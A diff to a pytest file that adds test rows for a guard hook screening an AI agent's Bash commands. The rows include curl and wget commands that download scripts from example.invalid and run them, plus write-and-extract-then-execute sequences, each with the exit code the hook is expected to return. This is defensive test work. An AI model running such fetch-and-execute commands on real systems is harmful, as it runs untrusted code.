@@ -10,6 +10,7 @@ import re
 import shutil
 import subprocess
 import sys
+import tarfile
 
 import pytest
 
@@ -3278,6 +3279,56 @@ def test_indirect_tool_outputs_and_log_reach_8ef78586_63109cf2(tmp_path):
         (tmp_path / d).mkdir(parents=True)
     wrong = []
     for stem, command, want in R98_GUARD_ROWS:
+        rc, _out, err = dispatch.run_one(
+            stem,
+            json.dumps({"tool_name": "Bash", "tool_input": {"command": command}, "cwd": root}),
+        )
+        if rc != want:
+            wrong.append((stem, command, rc, want, err[:160]))
+    assert not wrong, "\n".join(map(repr, wrong))
+
+
+# A LISTED ARCHIVE AND A LONG OPTION'S VALUE (reviews c988ab31.1, ff2ccadb.1). In a scratch tree holding a harmless `r.py` and `w.tar` holding only `a.py`, through dispatch.py: every `0` row was refused (rc 2) at 2572620116, an echoed b.py beside an extraction of w.tar read as unknown, and the value of `--referer` read as a download of `r.py`. The `2` rows are controls that still read a script as unknown: an a.py the archive replaces, an archive fed on stdin that the walk cannot list, and the file a download does write.
+R104_GUARD_ROWS = (
+    ("block_review_file_shell_write", "echo 'print(1)' > b.py && tar -xf w.tar && python3 b.py", 0),
+    ("block_review_file_shell_write", "echo 'print(1)' > a.py && tar -xf w.tar && python3 a.py", 2),
+    (
+        "block_review_file_shell_write",
+        "echo 'print(1)' > b.py && tar -xf - < w.tar && python3 b.py",
+        2,
+    ),
+    (
+        "block_review_file_shell_write",
+        "curl -sO --referer https://example.invalid/r.py https://example.invalid/x.py && python3 r.py",
+        0,
+    ),
+    (
+        "block_review_file_shell_write",
+        "curl -sO --referer https://example.invalid/r.py https://example.invalid/x.py && python3 x.py",
+        2,
+    ),
+    (
+        "block_review_file_shell_write",
+        "wget --referer https://example.invalid/r.py https://example.invalid/x.py && python3 r.py",
+        0,
+    ),
+    (
+        "block_review_file_shell_write",
+        "wget --referer https://example.invalid/r.py https://example.invalid/x.py && python3 x.py",
+        2,
+    ),
+)
+
+
+def test_listed_archives_and_long_option_values_c988ab31_ff2ccadb(tmp_path):
+    root = os.path.realpath(tmp_path)
+    (tmp_path / "r.py").write_text("print(1)\n", encoding="utf-8")
+    (tmp_path / "a.py").write_text("print(4)\n", encoding="utf-8")
+    with tarfile.open(tmp_path / "w.tar", "w") as archive:
+        archive.add(tmp_path / "a.py", arcname="a.py")
+    (tmp_path / "a.py").unlink()
+    wrong = []
+    for stem, command, want in R104_GUARD_ROWS:
         rc, _out, err = dispatch.run_one(
             stem,
             json.dumps({"tool_name": "Bash", "tool_input": {"command": command}, "cwd": root}),
